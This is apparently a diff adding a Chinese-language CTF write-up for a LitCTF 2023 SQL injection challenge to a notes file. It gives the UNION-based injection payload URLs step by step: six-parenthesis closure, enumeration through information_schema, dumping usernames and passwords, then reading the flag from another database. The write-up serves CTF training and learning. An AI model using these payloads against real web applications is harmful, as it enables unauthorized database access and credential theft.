@@ -308,3 +308,62 @@ echo  serialize($info);
 http://node5.anna.nssctf.cn:27731/?info=a:2:{s:8:"username";i:0;s:8:"password";i:0;}
 ```
 ![alt text](image-130.png)
+
+## [LitCTF 2023]这是什么？SQL ！注一下 ！
+>url:https://www.nssctf.cn/problem/3868
+>知识点：布尔盲注
+
+![alt text](image-142.png)
+根据提示判断闭合方式为))))))
+然后查询回显位数
+![alt text](image-145.png)
+![alt text](image-146.png)
+回显两位
+![alt text](image-147.png)
+上图显示两位都有数据
+构造payload查看表名
+```
+http://node5.anna.nssctf.cn:24324/?id=-1)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+```
+![alt text](image-148.png)
+只有一个users表，然后查询表中所有列名，构造payload：
+```
+http://node5.anna.nssctf.cn:24324/?id=1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"--+
+```
+![alt text](image-149.png)
+有三列
+然后
+```
+-1)))))) union select username,password from users--+
+```
+查询内容
+![alt text](image-150.png)
+得到一个假的flag
+看来不是这个数据库
+```
+-1)))))) union select 1,schema_name from information_schema.schemata--+
+
+```
+查询其他数据库
+![alt text](image-151.png)
+看到还有一个 ctftraining 数据库
+然后经行同样的操作
+```
+id=-1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema="ctftraining" 
+```
+区别就是将原来的database()改为数据库名，记住加双引号
+```
+http://node5.anna.nssctf.cn:24324/?id=-1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema="ctftraining" and table_name="flag"--+
+
+```
+
+![alt text](image-153.png)
+```
+-1)))))) union select 1,flag from ctftraining.flag--+
+```
+构造paload查找内容
+![alt text](image-154.png)
+得到falg
+
+
+
